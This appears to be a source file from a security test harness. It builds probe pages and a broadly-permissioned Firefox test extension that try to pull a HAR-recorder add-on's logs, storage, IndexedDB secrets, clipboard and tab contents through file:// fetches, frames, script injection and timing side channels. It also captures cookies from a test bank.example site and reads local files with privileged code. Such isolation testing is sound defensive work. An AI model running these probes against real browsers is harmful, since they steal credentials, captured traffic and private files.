import { PROBE_TABLE } from "./probe-table.ts";
import { buildStoredZip } from "./zip.ts";

export const PROBE_EXTENSION_ID = "och-probe@test";
export const OTHER_EXPERIMENT_ID = "och-other-experiment@test";

const PROBE_PERMISSIONS: readonly string[] = [
  "<all_urls>",
  "activeTab",
  "tabs",
  "scripting",
  "webRequest",
  "webRequestBlocking",
  "webNavigation",
  "downloads",
  "downloads.open",
  "cookies",
  "storage",
  "unlimitedStorage",
  "management",
  "nativeMessaging",
  "clipboardRead",
  "clipboardWrite",
  "notifications",
  "history",
  "sessions",
  "browsingData",
  "tabHide",
  "dns",
  "find",
];

const PROBE_META_JSON = JSON.stringify(
  PROBE_TABLE.map(({ id, positions }) => ({ id, pos: positions })),
);

/**
 * Shared probe runner executed in web, file, ext-bg, ext-page, cs-web, cs-file, and ext-devtools.
 * Metadata comes from PROBE_TABLE so browser probes and Node judgment never drift.
 */
export const PROBES_JS = `"use strict";
(function (root) {
  const META = ${PROBE_META_JSON};
  const clip = (s, n = 3000) => String(s).slice(0, n);
  const errText = (e) => (e && e.name ? e.name + ": " : "") + (e && e.message !== undefined ? e.message : String(e));
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const timeout = (ms, p, what) => Promise.race([p, sleep(ms).then(() => ({ outcome: "timeout", text: "no " + (what || "answer") + " within " + ms + " ms" }))]);
  // Every answer names the exact target the probe acted on, so the judge can hold it to the planned, witnessed one.
  const at = (target, p) => Promise.resolve(p).then((r) => ({ outcome: r.outcome, text: r.text, target }));
  const api = () => (typeof browser !== "undefined" ? browser : null);

  // The planned units of a probe at this position: targets, or [existing, missing] pairs.
  const units = (p, id) => p.targets[id + "@" + p.position] || p.targets[id] || [];
  const one = (p, id) => units(p, id)[0];
  const after = (unit, prefix) => (typeof unit === "string" && unit.startsWith(prefix) ? unit.slice(prefix.length) : "");

  function viaFetch(url, f) {
    const doFetch = f || fetch;
    return at(url, timeout(3000, (async () => {
      try {
        const r = await doFetch(url);
        const t = await r.text();
        return { outcome: "ok", text: "status " + r.status + ", " + t.length + " chars: " + clip(t) };
      } catch (e) { return { outcome: "error", text: errText(e) }; }
    })(), "fetch result"));
  }

  function viaXhr(url) {
    return at(url, timeout(3000, new Promise((resolve) => {
      try {
        const x = new XMLHttpRequest();
        x.open("GET", url);
        x.onload = () => resolve({ outcome: "ok", text: "status " + x.status + ", " + String(x.responseText).length + " chars: " + clip(x.responseText) });
        x.onerror = () => resolve({ outcome: "error", text: "error event, status " + x.status + ", readyState " + x.readyState });
        x.send();
      } catch (e) { resolve({ outcome: "error", text: errText(e) }); }
    }), "xhr event"));
  }

  // Posts into a frame and collects every message that reaches this window in the next 300 ms. A framed document
  // that answers at all is a way in, whatever it says.
  async function replies(win) {
    const got = [];
    const onMessage = (e) => { if (!(e.data && e.data.och === "probe-postmessage")) got.push(clip(JSON.stringify(e.data) || String(e.data), 300)); };
    window.addEventListener("message", onMessage);
    try { win.postMessage({ och: "probe-postmessage" }, "*"); } catch (e) {}
    await sleep(300);
    window.removeEventListener("message", onMessage);
    return got.length ? got.join(" | ") : "none";
  }

  const keep = [];
  // A frame at a file:// page fires no event either way, so it gets a short wait; every other element settles with
  // load or error, and its wait only has to outlast a slow machine.
  function element(tag, url, ms = tag === "iframe" ? 1500 : 10000) {
    return at(url, new Promise((resolve) => {
      const el = document.createElement(tag);
      let done = false;
      const finish = async (outcome) => {
        if (done) return;
        done = true;
        let text = outcome;
        if (tag === "iframe") {
          try {
            const d = el.contentDocument;
            text += d ? "; contentDocument readable, text: " + clip(d.documentElement ? d.documentElement.textContent : "", 2000) : "; contentDocument null";
          } catch (e) { text += "; contentDocument: " + errText(e); }
          try { text += "; contentWindow.location.href: " + el.contentWindow.location.href; } catch (e) { text += "; contentWindow.location.href: " + errText(e); }
          text += "; replies: " + (el.contentWindow ? await replies(el.contentWindow) : "no window");
        }
        if (tag === "link") {
          try { text += "; cssRules: " + (el.sheet ? el.sheet.cssRules.length : "no sheet"); } catch (e) { text += "; cssRules: " + errText(e); }
        }
        if (tag === "img") text += "; naturalWidth " + el.naturalWidth;
        keep.push(el);
        resolve({ outcome, text });
      };
      el.onload = () => finish("load");
      el.onerror = () => finish("error");
      setTimeout(() => finish("timeout"), ms);
      if (tag === "link") { el.rel = "stylesheet"; el.href = url; } else el.src = url;
      (document.body || document.documentElement).appendChild(el);
    }));
  }

  const pairOf = (a, b) => ({ outcome: a.outcome === b.outcome && a.text === b.text ? "same" : "differs", text: "existing path: " + a.outcome + "; " + a.text + " | missing path: " + b.outcome + "; " + b.text, target: a.target, pair: { hit: a, miss: b } });

  async function oracle(tag, unit) {
    const [a, b] = await Promise.all([element(tag, unit[0]), element(tag, unit[1])]);
    return pairOf(a, b);
  }

  async function observeTags(tags, url) {
    const got = await Promise.all(tags.map((tag) => element(tag, url)));
    return { outcome: got.map((g) => g.outcome).join(","), text: got.map((g, i) => tags[i] + " " + g.text).join(" | "), target: url };
  }

  async function inBatches(items, size, fn) {
    const out = [];
    for (let i = 0; i < items.length; i += size) out.push(...(await Promise.all(items.slice(i, i + size).map(fn))));
    return out;
  }

  // Eight targets at a time, so a slow machine still settles every load before its wait ends.
  async function oracleEach(tags, pairs) {
    const each = await inBatches(pairs, 8, async (unit) => {
      const [hit, miss] = await Promise.all([observeTags(tags, unit[0]), observeTags(tags, unit[1])]);
      const r = pairOf(hit, miss);
      return { target: unit[0], outcome: r.outcome, text: clip(r.text, 400), pair: r.pair };
    });
    return { outcome: "each", text: each.length + " targets", target: "", each };
  }

  async function fetchEach(urls) {
    const each = await Promise.all(urls.map(async (u) => {
      const f = await viaFetch(u);
      return { target: f.target, outcome: f.outcome, text: clip(f.text, 400) };
    }));
    return { outcome: "each", text: each.length + " targets", target: "", each };
  }

  function openTab(url, create) {
    const b = api();
    return at(url, (async () => {
      try {
        const tab = await create(url);
        await sleep(1000);
        let later = "";
        try { const t = await b.tabs.get(tab.id); later = "url " + t.url + ", status " + t.status + ", title " + t.title; } catch (e) { later = errText(e); }
        try { await b.tabs.remove(tab.id); } catch (e) {}
        return { outcome: "ok", text: "created; 1 s later: " + later };
      } catch (e) { return { outcome: "error", text: errText(e) }; }
    })());
  }

  function navigateVictim(plan, url) {
    const b = api();
    return at(url, (async () => {
      const tab = await b.tabs.create({ url: plan.victimUrl, active: false });
      await sleep(500);
      let res;
      try {
        await b.tabs.update(tab.id, { url });
        await sleep(1000);
        const t = await b.tabs.get(tab.id);
        res = { outcome: "ok", text: "update resolved; 1 s later: url " + t.url + ", title " + t.title };
      } catch (e) { res = { outcome: "error", text: errText(e) }; }
      try { await b.tabs.remove(tab.id); } catch (e) {}
      return res;
    })());
  }

  function windowOpen(url) {
    return at(url, (async () => {
      try {
        const w = window.open(url, "_blank");
        if (!w) return { outcome: "error", text: "window.open returned null" };
        await sleep(1000);
        let text = "opened";
        try { text += "; document text: " + clip(w.document.documentElement.textContent, 2000); } catch (e) { text += "; document: " + errText(e); }
        try { text += "; location: " + w.location.href; } catch (e) { text += "; location: " + errText(e); }
        try { w.close(); } catch (e) {}
        return { outcome: "ok", text };
      } catch (e) { return { outcome: "error", text: errText(e) }; }
    })());
  }

  async function reachEach(urls) {
    const each = await Promise.all(urls.map(async (u) => {
      const [f, e] = await Promise.all([viaFetch(u), element("link", u, 1500)]);
      return { target: u, outcome: "fetch " + f.outcome + ", link " + e.outcome, text: clip(f.text, 300) };
    }));
    return { outcome: "each", text: each.length + " targets", target: "", each };
  }

  function summarizeDownloads(items) {
    return items.map((d) => d.filename + " | url " + d.url + " | " + d.mime + " | " + d.fileSize + " bytes | exists " + d.exists + " | byExtensionId " + (d.byExtensionId || "-")).join("\\n") || "no download items";
  }

  function sendMessageTo(id) {
    return at("addon:" + id, (async () => {
      try {
        const r = await timeout(2500, api().runtime.sendMessage(id, { op: "getRecordingStatus" }), "reply");
        return r && r.outcome === "timeout" ? r : { outcome: "ok", text: "reply: " + JSON.stringify(r) };
      } catch (e) { return { outcome: "error", text: errText(e) }; }
    })());
  }

  function connectTo(id) {
    return at("addon:" + id, timeout(2500, new Promise((resolve) => {
      try {
        const port = api().runtime.connect(id);
        port.onDisconnect.addListener((p) => resolve({ outcome: "disconnected", text: "onDisconnect, error: " + (p.error ? p.error.message : "none") }));
        port.onMessage.addListener((m) => resolve({ outcome: "message", text: JSON.stringify(m) }));
        port.postMessage({ op: "getRecordingStatus" });
      } catch (e) { resolve({ outcome: "error", text: errText(e) }); }
    }), "disconnect or message"));
  }

  // Runs code in every tab showing the planned page; no such tab is no-target, never a denial.
  function injectInto(unit, inject) {
    const url = after(unit, "tab:");
    return at("tab:" + url, (async () => {
      const tabs = (await api().tabs.query({})).filter((t) => t.url === url);
      if (!tabs.length) return { outcome: "no-target", text: "tabs.query returned no tab showing " + url };
      const out = [];
      for (const t of tabs) {
        try { out.push("tab " + t.id + ": returned " + clip(JSON.stringify(await inject(t.id)), 400)); } catch (e) { out.push("tab " + t.id + " (" + t.url + "): " + errText(e)); }
      }
      return { outcome: "done", text: out.join("\\n") };
    })());
  }

  function timing(unit) {
    const once = async (url) => { const t0 = performance.now(); let e = ""; try { await fetch(url); e = "ok"; } catch (x) { e = errText(x); } return { ms: performance.now() - t0, e }; };
    return (async () => {
      const a = [], b = [];
      let ea = "", eb = "";
      for (let i = 0; i < 15; i++) {
        const x = await once(unit[0]); a.push(x.ms); ea = x.e;
        const y = await once(unit[1]); b.push(y.ms); eb = y.e;
      }
      const med = (v) => v.slice().sort((p, q) => p - q)[Math.floor(v.length / 2)].toFixed(2);
      const side = (e, target) => ({ outcome: e === "ok" ? "ok" : "error", text: e, target });
      return { outcome: ea === eb ? "same" : "differs", target: unit[0], pair: { hit: side(ea, unit[0]), miss: side(eb, unit[1]) }, text: "installed uuid: median " + med(a) + " ms, error \\"" + ea + "\\" | random uuid: median " + med(b) + " ms, error \\"" + eb + "\\" (15 each, alternating)" };
    })();
  }

  function idbValue(name, key) {
    return new Promise((resolve) => {
      const open = indexedDB.open(name);
      open.onerror = () => resolve("open error: " + errText(open.error));
      open.onsuccess = () => {
        const db = open.result;
        if (!db.objectStoreNames.contains("kv")) { db.close(); resolve("no kv store"); return; }
        const rq = db.transaction("kv").objectStore("kv").get(key);
        rq.onsuccess = () => { db.close(); resolve("kv." + key + " = " + rq.result); };
        rq.onerror = () => { db.close(); resolve("get error"); };
      };
    });
  }

  async function idbRead() {
    let names = "indexedDB.databases unavailable";
    try { names = JSON.stringify(await indexedDB.databases()); } catch (e) { names = errText(e); }
    const own = await idbValue("och-probe-own", "own");
    const rec = await idbValue("och-recorder", "secret");
    return { outcome: "ok", text: "own: " + own + "; databases(): " + names + "; och-recorder: " + rec };
  }

  function apiNamespace() {
    const b = typeof browser !== "undefined" ? typeof browser.oneClickHar : "n/a";
    const pageWin = typeof window.wrappedJSObject !== "undefined" ? window.wrappedJSObject : window;
    let pageOch;
    try { pageOch = typeof pageWin.oneClickHar; } catch (e) { pageOch = errText(e); }
    let globals = "n/a";
    if (location.protocol !== "moz-extension:") {
      try {
        const f = document.createElement("iframe");
        (document.body || document.documentElement).appendChild(f);
        const fw = f.contentWindow.wrappedJSObject || f.contentWindow;
        const fresh = new Set(Object.getOwnPropertyNames(fw));
        globals = JSON.stringify(Object.getOwnPropertyNames(pageWin).filter((n) => !fresh.has(n) && !/^OCH_/.test(n) && !/^[0-9]+$/.test(n)).sort());
        f.remove();
      } catch (e) { globals = errText(e); }
    }
    return { outcome: "ok", text: "typeof browser.oneClickHar: " + b + "; typeof page oneClickHar: " + pageOch + "; page globals not in a fresh frame: " + globals };
  }

  // A probe that acts on no URL still names its planned unit, so a typo in the plan shows as an unwitnessed target.
  const about = (unit, fn) => at(unit, (async () => { try { return await fn(); } catch (e) { return { outcome: "error", text: errText(e) }; } })());

  const fetchOne = (id) => (p) => viaFetch(one(p, id));
  const frameOne = (id) => (p) => element("iframe", one(p, id));
  const RUNNERS = {
    "fetch-file-log": fetchOne("fetch-file-log"),
    "fetch-file-body": fetchOne("fetch-file-body"),
    "fetch-file-dir": fetchOne("fetch-file-dir"),
    "fetch-file-export": fetchOne("fetch-file-export"),
    "inventory-read": (p) => fetchEach(units(p, "inventory-read")),
    "inventory-exists": (p) => oracleEach(["script", "link"], units(p, "inventory-exists")),
    "content-fetch-file-log": (p) => viaFetch(one(p, "content-fetch-file-log"), (typeof content !== "undefined" && content.fetch) ? content.fetch.bind(content) : null),
    "xhr-file-log": (p) => viaXhr(one(p, "xhr-file-log")),
    "iframe-file-log": frameOne("iframe-file-log"),
    "iframe-file-root": frameOne("iframe-file-root"),
    "iframe-file-export": frameOne("iframe-file-export"),
    "img-file-oracle": (p) => oracle("img", one(p, "img-file-oracle")),
    "script-file-oracle": (p) => oracleEach(["script"], units(p, "script-file-oracle")),
    "css-file-oracle": (p) => oracleEach(["link"], units(p, "css-file-oracle")),
    "iframe-site-oracle": (p) => oracleEach(["iframe"], units(p, "iframe-site-oracle")),
    "script-root-oracle": (p) => oracle("script", one(p, "script-root-oracle")),
    "script-site-oracle": (p) => oracleEach(["script"], units(p, "script-site-oracle")),
    "viewsource-fetch": fetchOne("viewsource-fetch"),
    "viewsource-iframe": frameOne("viewsource-iframe"),
    "jar-file-fetch": fetchOne("jar-file-fetch"),
    "jar-file-iframe": frameOne("jar-file-iframe"),
    "redirect-fetch": fetchOne("redirect-fetch"),
    "redirect-iframe": frameOne("redirect-iframe"),
    "window-open-file": (p) => windowOpen(one(p, "window-open-file")),
    "wr-redirect-iframe": frameOne("wr-redirect-iframe"),
    "tabs-create-file": (p) => openTab(one(p, "tabs-create-file"), (url) => api().tabs.create({ url, active: false })),
    "tabs-create-dir": (p) => openTab(one(p, "tabs-create-dir"), (url) => api().tabs.create({ url, active: false })),
    "tabs-update-file": (p) => navigateVictim(p, one(p, "tabs-update-file")),
    "tabs-update-redirect": (p) => navigateVictim(p, one(p, "tabs-update-redirect")),
    "windows-create-file": (p) => openTab(one(p, "windows-create-file"), async (url) => (await api().windows.create({ url })).tabs[0]),
    "downloads-download-file": (p) => { const url = one(p, "downloads-download-file"); return about(url, async () => { const id = await api().downloads.download({ url, filename: "probe-copy.jsonl", conflictAction: "uniquify" }); await sleep(1000); const [d] = await api().downloads.search({ id }); return { outcome: "ok", text: "download " + id + " state " + (d && d.state) + " error " + (d && d.error) + " file " + (d && d.filename) }; }); },
    "tabs-create-viewsource": (p) => openTab(one(p, "tabs-create-viewsource"), (url) => api().tabs.create({ url, active: false })),
    "wr-redirect-tab": (p) => openTab(one(p, "wr-redirect-tab"), (url) => api().tabs.create({ url, active: false })),
    "resource-all": (p) => reachEach(units(p, "resource-all")),
    "resource-traversal": (p) => reachEach(units(p, "resource-traversal")),
    "planted-resource": async (p) => { const unit = one(p, "planted-resource"); const o = await oracle("link", unit); const f = await viaFetch(unit[0]); return { outcome: o.outcome, target: o.target, pair: o.pair, text: o.text + " | fetch: " + f.text }; },
    "chrome-all": (p) => reachEach(units(p, "chrome-all")),
    "chrome-traversal": (p) => reachEach(units(p, "chrome-traversal")),
    "moz-src-root": (p) => reachEach(units(p, "moz-src-root")),
    "mozext-every-file": (p) => fetchEach(units(p, "mozext-every-file")),
    "mozext-manifest": fetchOne("mozext-manifest"),
    "mozext-parent": fetchOne("mozext-parent"),
    "mozext-schema": fetchOne("mozext-schema"),
    "mozext-popup": fetchOne("mozext-popup"),
    "mozext-script-oracle": (p) => oracle("script", one(p, "mozext-script-oracle")),
    "mozext-timing": (p) => timing(one(p, "mozext-timing")),
    "mozext-frame-recorder": frameOne("mozext-frame-recorder"),
    "planted-own-war-fetch": fetchOne("planted-own-war-fetch"),
    "planted-own-war-script": async (p) => { const r = await element("script", one(p, "planted-own-war-script")); return { outcome: r.outcome, target: r.target, text: r.text + "; window.OCH_WAR = " + (typeof window.OCH_WAR === "undefined" ? "undefined" : window.OCH_WAR) }; },
    "own-non-war": fetchOne("own-non-war"),
    "api-namespace": (p) => about(one(p, "api-namespace"), async () => apiNamespace()),
    "api-call": (p) => about(one(p, "api-call"), async () => ({ outcome: "ok", text: JSON.stringify(await browser.oneClickHar.getRecordingStatus()) })),
    "sendmessage-recorder": (p) => sendMessageTo(after(one(p, "sendmessage-recorder"), "addon:")),
    "sendmessage-oracle": async (p) => { const unit = one(p, "sendmessage-oracle"); const a = await sendMessageTo(after(unit[0], "addon:")); const b = await sendMessageTo(after(unit[1], "addon:")); return { outcome: a.text === b.text ? "same" : "differs", target: a.target, pair: { hit: a, miss: b }, text: "recorder: " + a.text + " | not installed: " + b.text }; },
    "connect-recorder": (p) => connectTo(after(one(p, "connect-recorder"), "addon:")),
    "tabs-query-recorder": (p) => about(one(p, "tabs-query-recorder"), async () => { const t = await api().tabs.query({}); return { outcome: "ok", text: t.map((x) => x.id + " " + x.url + " " + x.title).join("\\n") }; }),
    "executescript-recorder-page": (p) => injectInto(one(p, "executescript-recorder-page"), (tabId) => api().tabs.executeScript(tabId, { code: "document.documentElement.outerHTML" })),
    "scripting-recorder-page": (p) => injectInto(one(p, "scripting-recorder-page"), (tabId) => api().scripting.executeScript({ target: { tabId }, func: () => document.documentElement.outerHTML })),
    "management-getall": (p) => about(one(p, "management-getall"), async () => { const all = await api().management.getAll(); return { outcome: "ok", text: all.map((a) => a.id + " | " + a.name + " | " + a.type + " | enabled " + a.enabled + " | " + a.installType + " | permissions " + JSON.stringify(a.permissions) + " | hosts " + JSON.stringify(a.hostPermissions)).join("\\n") }; }),
    "downloads-search": (p) => about(one(p, "downloads-search"), async () => ({ outcome: "ok", text: summarizeDownloads(await api().downloads.search({})) })),
    "clipboard-after-export": (p) => about(one(p, "clipboard-after-export"), async () => ({ outcome: "ok", text: "clipboard text: " + clip(await navigator.clipboard.readText(), 1000) })),
    "notifications-getall": (p) => about(one(p, "notifications-getall"), async () => ({ outcome: "ok", text: JSON.stringify(await api().notifications.getAll()) })),
    "storage-recorder": (p) => about(one(p, "storage-recorder"), async () => ({ outcome: "ok", text: JSON.stringify(await api().storage.local.get(null)) })),
    "idb-recorder": (p) => about(one(p, "idb-recorder"), () => idbRead()),
    "devtools-gethar": (p) => about(one(p, "devtools-gethar"), async () => {
      try { browser.devtools.inspectedWindow.reload({}); } catch (e) {}
      const deadline = Date.now() + 5000;
      let har = { entries: [] };
      while (Date.now() < deadline) {
        har = await browser.devtools.network.getHAR();
        if (har.entries.some((e) => e.request.url.includes("bank.example/api/done"))) break;
        await sleep(100);
      }
      return { outcome: "ok", text: har.entries.length + " entries: " + clip(JSON.stringify(har.entries.map((e) => ({ url: e.request.url, cookie: (e.request.headers.find((h) => /^cookie$/i.test(h.name)) || {}).value }))), 1500) };
    }),
    "baseline-webrequest": (p) => about(one(p, "baseline-webrequest"), async () => ({ outcome: "ok", text: JSON.stringify(root.OCH_BASELINE || {}) })),
  };

  // Reports exactly what each runner returned: nothing is filled in or coerced, so a missing field reaches the judge
  // as missing and can only become NO-RESULT.
  async function runAll(position, plan, report, only, asPosition) {
    plan.position = position;
    for (const meta of META) {
      if (!meta.pos.includes(asPosition || position)) continue;
      if (only && !only.includes(meta.id)) continue;
      let observed;
      try {
        const fn = RUNNERS[meta.id];
        observed = fn ? await fn(plan) : { outcome: "threw", text: "missing runner for " + meta.id, target: "" };
      } catch (e) {
        observed = { outcome: "threw", text: errText(e), target: "" };
      }
      await report({ kind: "row", browser: plan.browser, position, probe: meta.id, observed });
    }
    await report({ kind: "position-done", browser: plan.browser, position, href: String(location.href), origin: String(location.origin) });
  }

  root.OCH_PROBES = { runAll };
})(typeof window !== "undefined" ? window : globalThis);
`;

export const PAGE_RUNNER_JS = `"use strict";
(async function run(BASE, pos) {
  const report = (row) => fetch(BASE + "/report", { method: "POST", body: JSON.stringify(row) }).catch(() => {});
  const pause = (ms) => new Promise((r) => setTimeout(r, ms));
  let plan = null;
  while (!plan) {
    try { const p = await (await fetch(BASE + "/plan")).json(); if (p.ready) plan = p; } catch (e) {}
    if (!plan) await pause(100);
  }
  for (;;) {
    try { const g = await (await fetch(BASE + "/go?pos=" + pos)).json(); if (g.go) break; } catch (e) {}
    await pause(100);
  }
  const second = pos === "file-no-marionette";
  await OCH_PROBES.runAll(pos, plan, report, second ? plan.noMarionetteProbes : null, second ? "file" : pos);
})(window.OCH_BASE, new URLSearchParams(location.search).get("pos") || window.OCH_POS);
`;

export const PROBE_HTML = `<!doctype html>
<meta charset="utf-8">
<title>attacker page</title>
<body>
<p>An ordinary web page with a content principal.</p>
<script>window.OCH_BASE = ""; window.OCH_POS = "web";</script>
<script src="/probes.js"></script>
<script src="/runner.js"></script>
</body>`;

export function buildSavedPageHtml(serverOrigin: string): string {
  return `<!doctype html>
<meta charset="utf-8">
<title>saved page</title>
<body>
<p>A saved HTML file opened from the Downloads folder.</p>
<script>window.OCH_BASE = ${JSON.stringify(serverOrigin)}; window.OCH_POS = "file";</script>
<script>
${PROBES_JS}
</script>
<script>
${PAGE_RUNNER_JS}
</script>
</body>`;
}

export function buildProbeExtensionXpi(options: {
  readonly serverOrigin: string;
  readonly warMark: string;
  readonly secretMark: string;
  readonly ownMark: string;
}): Buffer {
  const manifest = JSON.stringify(
    {
      manifest_version: 2,
      name: "Isolation probe extension",
      version: "1.0",
      browser_specific_settings: { gecko: { id: PROBE_EXTENSION_ID } },
      permissions: PROBE_PERMISSIONS,
      background: { scripts: ["probes.js", "common.js", "background.js"] },
      content_scripts: [
        {
          matches: ["<all_urls>"],
          js: ["probes.js", "common.js", "cs.js"],
          all_frames: true,
          match_about_blank: true,
          run_at: "document_idle",
        },
      ],
      devtools_page: "devtools.html",
      web_accessible_resources: ["war.txt", "war.js"],
    },
    null,
    2,
  );

  const commonJs = `"use strict";
const SERVER = ${JSON.stringify(options.serverOrigin)};
const IN_CONTENT_SCRIPT = location.protocol !== "moz-extension:";
const pause = (ms) => new Promise((r) => setTimeout(r, ms));
const relay = (op, arg) => browser.runtime.sendMessage({ och: op, arg });
const report = (row) => (IN_CONTENT_SCRIPT ? relay("report", row) : fetch(SERVER + "/report", { method: "POST", body: JSON.stringify(row) })).catch(() => {});
const getJson = async (p) => (IN_CONTENT_SCRIPT ? relay("get", p) : (await fetch(SERVER + p)).json());
async function getPlan(limitMs = 120000) {
  const t0 = Date.now();
  while (Date.now() - t0 < limitMs) {
    try { const p = await getJson("/plan"); if (p && p.ready) return p; } catch (e) {}
    await pause(100);
  }
  return null;
}
async function waitGo(pos, limitMs = 120000) {
  const t0 = Date.now();
  while (Date.now() - t0 < limitMs) {
    try { const g = await getJson("/go?pos=" + pos); if (g && g.go) return true; } catch (e) {}
    await pause(100);
  }
  return false;
}
async function runPosition(pos) {
  const plan = await getPlan();
  if (!plan || !(await waitGo(pos))) return;
  await OCH_PROBES.runAll(pos, plan, report);
}
`;

  const backgroundJs = `"use strict";
const OWN_MARK = ${JSON.stringify(options.ownMark)};
browser.storage.local.set({ own: OWN_MARK });
{
  const open = indexedDB.open("och-probe-own", 1);
  open.onupgradeneeded = () => open.result.createObjectStore("kv");
  open.onsuccess = () => {
    const tx = open.result.transaction("kv", "readwrite");
    tx.objectStore("kv").put(OWN_MARK, "own");
    tx.oncomplete = () => open.result.close();
  };
}
window.OCH_BASELINE = { cookieHeaders: [], responseBodies: [] };
let livePlan = null;
getPlan().then((p) => { livePlan = p; });
browser.webRequest.onBeforeSendHeaders.addListener((d) => {
  if (!/^http:\\/\\/bank\\.example\\//.test(d.url)) return;
  const c = d.requestHeaders.find((h) => /^cookie$/i.test(h.name));
  if (c) window.OCH_BASELINE.cookieHeaders.push(d.url + " Cookie: " + c.value);
}, { urls: ["<all_urls>"] }, ["requestHeaders"]);
browser.webRequest.onBeforeRequest.addListener((d) => {
  if (/^http:\\/\\/bank\\.example\\/api\\//.test(d.url)) {
    const f = browser.webRequest.filterResponseData(d.requestId);
    const dec = new TextDecoder();
    let text = "";
    f.ondata = (e) => { text += dec.decode(e.data, { stream: true }); f.write(e.data); };
    f.onstop = () => { window.OCH_BASELINE.responseBodies.push(d.url + " body: " + text.slice(0, 300)); f.close(); };
  }
  if (livePlan && d.url.startsWith(livePlan.wrRedirect)) return { redirectUrl: livePlan.file.log };
  return undefined;
}, { urls: ["<all_urls>"] }, ["blocking"]);
browser.runtime.onMessage.addListener((msg) => {
  if (!msg || !msg.och) return undefined;
  if (msg.och === "report") return fetch(SERVER + "/report", { method: "POST", body: JSON.stringify(msg.arg) }).then(() => true);
  if (msg.och === "get") return fetch(SERVER + msg.arg).then((r) => r.json());
  return undefined;
});
runPosition("ext-bg");
`;

  const csJs = `"use strict";
(async () => {
  const href = location.href;
  const relevant = location.protocol === "file:" || location.host === "attacker.example";
  if (!relevant) return;
  report({ kind: "cs-hello", href, top: window.top === window });
  const plan = await getPlan(120000);
  if (!plan) return;
  if (href.startsWith("file:") && !href.startsWith(plan.file.savedPage)) {
    const inArchive = href.startsWith(plan.file.root) || href.startsWith(plan.file.export);
    let text = "";
    try { text = document.documentElement ? document.documentElement.textContent : ""; } catch (e) { text = "read error " + e; }
    await report({ kind: "cs-file-doc", browser: plan.browser, inArchive, href, top: window.top === window, text: String(text).slice(0, 4000) });
    return;
  }
  if (window.top !== window) return;
  const pos = href.startsWith(plan.webProbeUrl) ? "cs-web" : href.startsWith(plan.file.savedPage) ? "cs-file" : null;
  if (!pos || !(await waitGo(pos))) return;
  await OCH_PROBES.runAll(pos, plan, report);
})();
`;

  const pageHtml = `<!doctype html><meta charset="utf-8"><title>probe extension page</title><body><script src="probes.js"></script><script src="common.js"></script><script src="page.js"></script></body>`;
  const devtoolsHtml = `<!doctype html><meta charset="utf-8"><body><script src="probes.js"></script><script src="common.js"></script><script src="devtools.js"></script></body>`;

  return buildStoredZip([
    { name: "manifest.json", data: Buffer.from(manifest, "utf8") },
    { name: "probes.js", data: Buffer.from(PROBES_JS, "utf8") },
    { name: "common.js", data: Buffer.from(commonJs, "utf8") },
    { name: "background.js", data: Buffer.from(backgroundJs, "utf8") },
    { name: "cs.js", data: Buffer.from(csJs, "utf8") },
    { name: "page.html", data: Buffer.from(pageHtml, "utf8") },
    { name: "page.js", data: Buffer.from('runPosition("ext-page");\n', "utf8") },
    { name: "devtools.html", data: Buffer.from(devtoolsHtml, "utf8") },
    { name: "devtools.js", data: Buffer.from('runPosition("ext-devtools");\n', "utf8") },
    { name: "war.txt", data: Buffer.from(`${options.warMark}\n`, "utf8") },
    {
      name: "war.js",
      data: Buffer.from(`window.OCH_WAR = ${JSON.stringify(options.warMark)};\n`, "utf8"),
    },
    { name: "secret.txt", data: Buffer.from(`${options.secretMark}\n`, "utf8") },
  ]);
}

export function buildOtherExperimentXpi(): Buffer {
  const manifest = JSON.stringify(
    {
      manifest_version: 2,
      name: "Another experiment API add-on",
      version: "0.0.1",
      browser_specific_settings: { gecko: { id: OTHER_EXPERIMENT_ID } },
      experiment_apis: {
        otherExp: {
          schema: "schema.json",
          parent: {
            scopes: ["addon_parent"],
            script: "parent.js",
            paths: [["otherExp"]],
            events: ["startup"],
          },
        },
      },
    },
    null,
    2,
  );

  const schema = JSON.stringify([{ namespace: "otherExp", functions: [] }]);
  const parentJs = `"use strict";
const reader = {
  observe(subject, topic, path) {
    const out = { processType: Services.appinfo.processType, isSystemPrincipal: Cu.getObjectPrincipal(this).isSystemPrincipal };
    try {
      const f = Cc["@mozilla.org/file/local;1"].createInstance(Ci.nsIFile);
      f.initWithPath(path);
      const fis = Cc["@mozilla.org/network/file-input-stream;1"].createInstance(Ci.nsIFileInputStream);
      fis.init(f, 0x01, 0, 0);
      const sis = Cc["@mozilla.org/scriptableinputstream;1"].createInstance(Ci.nsIScriptableInputStream);
      sis.init(fis);
      out.text = sis.read(Math.min(fis.available(), 4000));
      fis.close();
    } catch (e) { out.error = String(e).slice(0, 300); }
    Services.prefs.setStringPref("och.otherexp.result", JSON.stringify(out));
  },
};
this.otherExp = class extends ExtensionAPI {
  onStartup() { Services.obs.addObserver(reader, "och-other-exp-read"); }
  onShutdown() { try { Services.obs.removeObserver(reader, "och-other-exp-read"); } catch (e) {} }
  getAPI() { return { otherExp: {} }; }
};
`;

  return buildStoredZip([
    { name: "manifest.json", data: Buffer.from(manifest, "utf8") },
    { name: "schema.json", data: Buffer.from(schema, "utf8") },
    { name: "parent.js", data: Buffer.from(parentJs, "utf8") },
  ]);
}
